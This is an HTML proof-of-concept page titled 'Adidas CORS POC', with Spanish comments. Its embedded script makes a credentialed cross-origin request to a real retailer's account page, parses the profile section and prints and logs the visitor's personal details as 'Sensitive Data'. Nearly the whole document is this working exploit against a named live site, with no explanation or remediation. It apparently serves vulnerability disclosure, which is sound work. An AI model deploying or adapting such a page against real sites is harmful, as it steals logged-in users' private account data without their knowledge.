<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adidas CORS POC</title>
</head>
<body>

<h2>Extracted Sensitive Data</h2>
<pre id="output">Cargando...</pre>

<script>
fetch("https://www.adidas.com/ec/es/account", {
    method: "GET",
    credentials: "include"
})
.then(response => response.text())
.then(html => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, "text/html");

    // Solo el bloque de perfil
    const profileSection = doc.querySelector(".card-body.details");

    if (!profileSection) {
        document.getElementById("output").textContent =
            "No se encontró la sección de perfil.";
        return;
    }

    const extracted = [];

    profileSection.querySelectorAll("dl dd, dl dt").forEach(el => {
        const text = el.textContent.trim();
        if (text.length > 0) {
            extracted.push(text);
        }
    });

    document.getElementById("output").textContent =
        extracted.join("\n");

    console.log("Sensitive Data:", extracted);
})
.catch(error => {
    document.getElementById("output").textContent =
        "Error: " + error;
    console.error(error);
});
</script>

</body>
</html>
